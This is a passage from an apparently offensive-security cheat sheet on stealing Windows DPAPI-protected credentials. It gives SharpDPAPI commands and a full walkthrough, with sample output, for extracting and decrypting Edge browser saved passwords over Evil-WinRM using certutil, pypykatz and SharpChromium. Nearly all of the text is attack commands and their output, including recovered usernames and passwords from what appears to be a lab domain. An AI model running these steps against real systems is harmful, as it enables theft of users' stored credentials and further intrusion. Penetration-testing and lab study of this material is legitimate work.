    description      : Enterprise Credential Data

    LastWritten      : 1/18/2024 11:53:30 AM
    TargetName       : Domain:interactive=office\hhogan
    TargetAlias      : 
    Comment          : 
    UserName         : office\hhogan
    Credential       : 



SharpDPAPI completed in 00:00:00.1707869
```

{{< /tabcontent >}}
{{< tabcontent set2 tab3 >}}

```console
# Run as system
sharpdpapi -- 'machinetriage'
```

```console
# Run as user
sharpdpapi -- 'credentials /password:<PASSWORD>'
```

```console
# Run as user (without password)
sharpdpapi -- 'credentials /rpc'
```

{{< /tabcontent >}}

---

### Abuse #2: Browser Saved Creds

{{< tab set3 tab1 >}}Offline{{< /tab >}}
{{< tab set3 tab2 >}}Auto{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Prepare logindata and localstate file

```console
# Get Local State json file, copy and paste to local Linux
type "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Local State"
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> type "C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Local State"

{"abusive_adblocker_etag":"\"1651629182\"",...[SNIP]...,"web_widget":{"disabled_due_extensions":false}}
```

```console
# Get Login Data binary file
certutil -encode "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\ProgramData\logindata
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> certutil -encode "C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\ProgramData\logindata
Input Length = 55296
Output Length = 76088
CertUtil: -encode command completed successfully.
```

```console
# Copy and paste to local Linux (Exclude BEGIN and END CERTIFIATE)
type C:\ProgramData\logindata
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> type C:\ProgramData\logindata
-----BEGIN CERTIFICATE-----
U1FMaXRlIGZvcm1hdCAzAAgAAQEAQCAgAAAAAgAAABsAAAAAAAAAAAAAABAAAAAE
AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
...[SNIP]...
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----END CERTIFICATE-----
```

```console
# Base64 decode
cat logindata_b64 | base64 -d > logindata
```

```console {class="sample-code"}
$ cat logindata_b64 | base64 -d > logindata
```

```console
# Extract key from local state
cat localstate.json | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
```

```console {class="sample-code"}
$ cat localstate.json | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
```

```console
# Get masterkey_guid
pypykatz dpapi describe blob blob
```

```console {class="sample-code"}
$ pypykatz dpapi describe blob blob
== DPAPI_BLOB ==
version: 1 
credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
masterkey_version: 1 
masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 
...[SNIP]...
```

<small>*Ref: [pypykatz](https://github.com/skelsec/pypykatz)*</small>

#### 2. Retrieve Keys

```console
# Get master key
certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID>" C:\ProgramData\<MASTERKEY_GUID>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> certutil -encode "C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761\a8bd1009-f2ac-43ca-9266-8e029f503e11 " C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
Input Length = 740
Output Length = 1076
CertUtil: -encode command completed successfully.
```

```console
# Copy and paste to local Linux
type C:\ProgramData\<MASTERKEY_GUID>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> type C:\ProgramData\a8bd1009-f2ac-43ca-9266-8e029f503e11
-----BEGIN CERTIFICATE-----
AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
...[SNIP]...
Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
29h5Ie/21Ms2D8kNzPms0rzLbXA=
-----END CERTIFICATE-----
```

```console
# Base64 decode
cat masterkey_guid_b64 | base64 -d > masterkey_guid
```

```console {class="sample-code"}
$ cat masterkey_guid_b64 | base64 -d > masterkey_guid
```

#### 3. Decrypt

```console
pypykatz dpapi prekey password <SID> '<PASSWORD>' | tee pkf
```

```console {class="sample-code"}
$ pypykatz dpapi prekey password S-1-5-21-1844305427-4058123335-2739572863-2761 '!@p%i&J#iNNo1T2' | tee pkf
4ea57b2e9e19cb91226b1ce0f64e4edad3d56c82
0fcd9d392606c1dbf84c875dcfad678ca56cb607
202e6812a189277e0ccd0bc72dcfdd4ed6e9469e
```

```console
pypykatz dpapi masterkey masterkey_guid pkf -o mkf
```

```console {class="sample-code"}
$ pypykatz dpapi masterkey masterkey_guid pkf -o mkf
```

```console
pypykatz dpapi chrome --logindata logindata mkf localstate.json
```

```console {class="sample-code"}
$ pypykatz dpapi chrome --logindata logindata mkf localstate.json
file: logindata user: bob.wood@windcorp.htb pass: b'SemTro\xc2\xa432756Gff' url: http://somewhere.com/action_page.php
file: logindata user: bob.wood@windcorp.htb pass: b'SomeSecurePasswordIGuess!09' url: http://google.com/action_page.php
file: logindata user: bob.woodADM@windcorp.com pass: b'smeT-Worg-wer-m024' url: http://webmail.windcorp.com/action_page.php
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
.\SharpChromium.exe logins
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\debug\wia> .\SharpChromium.exe logins
[*] Beginning Edge extraction.

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://somewhere.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SemTro32756Gff

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://google.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SomeSecurePasswordIGuess!09

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://webmail.windcorp.com/action_page.php
Username : bob.woodADM@windcorp.com
Password : smeT-Worg-wer-m024

[*] Finished Edge extraction.

[*] Done.
```

<small>*Ref: [SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)*</small>

{{< /tabcontent >}}
